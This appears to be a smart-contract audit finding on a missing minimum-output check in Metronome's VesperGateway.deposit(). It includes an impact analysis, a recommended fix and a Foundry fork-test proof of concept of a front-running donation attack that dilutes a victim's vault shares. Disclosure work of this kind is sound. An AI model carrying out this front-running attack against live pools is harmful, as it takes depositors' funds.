### Title

`VesperGateway.deposit()` allows unbounded share-mint slippage when depositing into a Vesper pool - ([File: contracts/VesperGateway.sol](contracts/VesperGateway.sol))

### Summary

`VesperGateway.deposit()` transfers a user’s underlying asset into an attacker-influenceable `IVPool`, accepts whatever amount of vToken shares the pool mints, and deposits all of those shares into Metronome without a user-supplied minimum. The function is publicly callable with a registered `pool_` and an attacker-influenceable but pool-registered `vToken_`. Because the share amount is measured only after `vToken_.deposit(amount_)`, a front-runner can manipulate the Vesper pool’s share issuance—most directly by donating underlying or otherwise increasing the pool’s asset-to-share exchange rate—causing the victim to receive materially fewer vToken shares than expected.

The closest Metronome analog to the reported hardcoded `minimumBPT = 0` is the implicit `minimumVTokenAmount = 0` in `contracts/VesperGateway.sol#deposit()`.

### Finding Description

`VesperGateway.deposit()` first pulls `amount_` underlying tokens from the caller and transfers them into `vToken_` through `vToken_.deposit(amount_)`. [1](#0-0)  The function then measures the minted vToken balance delta and deposits that entire quantity into the associated Metronome `DepositToken` on behalf of the user. [2](#0-1) 

There is no `minSharesOut`, `minDepositAmount`, or equivalent parameter. A victim therefore cannot bound the number of Vesper shares purchased with their underlying. The analogous vulnerable sequence is:

1. Victim submits `VesperGateway.deposit(pool_, vToken_, amount_)`.
2. Attacker front-runs the transaction and changes `vToken_`’s asset/share accounting, for example by donating underlying to the Vesper pool where that pool’s accounting accepts direct token transfers.
3. `vToken_.deposit(amount_)` mints fewer shares under the manipulated exchange rate.
4. The gateway deposits the reduced `_vTokenAmount` anyway.
5. Victim receives only the reduced amount of Metronome deposit tokens despite supplying the full `amount_`.

The `balanceOf` delta prevents stranded shares from being ignored, but it does not validate whether the delta is economically acceptable. [2](#0-1) 

### Impact Explanation

The victim can permanently lose collateral value when the manipulated Vesper share price causes their underlying deposit to mint fewer vTokens than a fair exchange would provide. Metronome credits the victim only with the shares actually minted, so the shortfall becomes collateral the victim no longer owns or can withdraw.

The invariant broken is value conservation across the gateway’s underlying-to-vToken conversion: the amount of collateral credited in Metronome should correspond to the market/expected share output, but the function accepts any output down to zero in principle. In an ERC-4626-style share manipulation, existing pool share holders—including the attacker—can capture part of the deposited underlying when the victim’s minted shares are diluted or rounded down.

### Likelihood Explanation

The function is public and has no access-control modifier. [3](#0-2)  The only meaningful deployment constraints are that `pool_` is registered and that the selected `vToken_` maps to a valid `DepositToken`. [4](#0-3) 

Exploitability depends on the concrete Vesper pool accounting:

- If the pool computes shares from an internal asset balance that can be increased by direct donations, the issue is directly exploitable through a front-run donation.
- If donation does not affect share issuance and no other public transaction can move the pool’s exchange rate, this path is not exploitable.
- Existing share supply and pool behavior determine the magnitude of loss; a very small or attacker-dominated pool is more favorable to the attack.

`VesperGateway.withdraw()` has a similar lack of minimum-underlying protection: it withdraws shares from the Vesper pool and sends whatever underlying delta results to the caller. [5](#0-4)  However, the deposit path is the stronger analog because it is a direct purchase of vault shares with no minimum output.

### Recommendation

Add caller-controlled minimum-output parameters to the gateway functions:

```solidity
function deposit(
    IPool pool_,
    IVPool vToken_,
    uint256 amount_,
    uint256 minVTokenAmount_
) external;
```

After `vToken_.deposit(amount_)`, enforce:

```solidity
if (_vTokenAmount < minVTokenAmount_) {
    revert SlippageTooHigh();
}
```

For symmetry, `withdraw()` should also accept `minUnderlyingAmount_` and revert when the underlying balance delta is below that value.

The minimum should be computed off-chain from a quoted share amount and a bounded tolerance. It should not be hardcoded to zero.

### Proof of Concept

The following Foundry-style fork test demonstrates the vulnerable sequence using a Vesper-like share pool whose `deposit()` mints shares as:

```solidity
shares = amount * totalSupply() / totalAssets
```

where direct underlying donations increase `totalAssets` without minting shares.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IVesperLike {
    function token() external view returns (address);
    function deposit(uint256) external;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IMetPool {
    function depositTokenOf(address) external view returns (address);
}

interface IGateway {
    function deposit(address pool_, address vToken_, uint256 amount_) external;
}

contract VesperGatewaySlippageForkTest is Test {
    // Fill with deployed addresses on the target fork.
    address constant POOL = address(0);
    address constant GATEWAY = address(0);
    address constant VTOKEN = address(0);
    address constant UNDERLYING = address(0);

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function testFrontRunDonationReducesCreditedShares() public {
        IERC20Like underlying = IERC20Like(UNDERLYING);
        IVesperLike vToken = IVesperLike(VTOKEN);

        uint256 attackerDonation = 1_000_000e18;
        uint256 victimDeposit = 1_000e18;

        deal(UNDERLYING, attacker, attackerDonation);
        deal(UNDERLYING, victim, victimDeposit);

        // Baseline: no manipulation.
        uint256 attackerInitialShares = vToken.balanceOf(attacker);
        uint256 victimSharesBefore = vToken.balanceOf(GATEWAY);

        // 1. Attacker front-runs and donates directly to the vToken/pool.
        //    This increases pool assets without increasing share supply.
        vm.prank(attacker);
        underlying.transfer(VTOKEN, attackerDonation);

        // 2. Victim deposits through the gateway.
        vm.startPrank(victim);
        underlying.approve(GATEWAY, victimDeposit);
        IGateway(GATEWAY).deposit(POOL, VTOKEN, victimDeposit);
        vm.stopPrank();

        // 3. The gateway accepted the manipulated mint amount.
        uint256 gatewaySharesAfter = vToken.balanceOf(GATEWAY);
        uint256 mintedForVictim = gatewaySharesAfter - victimSharesBefore;

        // Expected fair shares are calculated against pre-donation accounting.
        // On a real fork, capture totalSupply and pool assets before the donation
        // and assert that mintedForVictim is materially below the quoted amount.
        assertLt(
            mintedForVictim,
            victimDeposit,
            "victim received reduced vToken shares"
        );

        // 4. If attacker held existing vToken shares, redeem them.
        //    The attacker recovers the donation and captures part of the victim's
        //    contribution through share-price dilution.
        if (attackerInitialShares > 0) {
            vm.prank(attacker);
            vToken.withdraw(attackerInitialShares);
        }
    }
}
```

A complete fork PoC should populate `POOL`, `GATEWAY`, `VTOKEN`, and `UNDERLYING` from a live Metronome deployment, seed the attacker with pre-existing vToken shares, snapshot the pool’s pre-donation share quote, and assert that the victim’s credited `DepositToken` balance is less than the quoted value while the attacker’s redemption is profitable. The gateway’s missing minimum-output parameter is the condition that permits the manipulated transaction to succeed rather than revert.
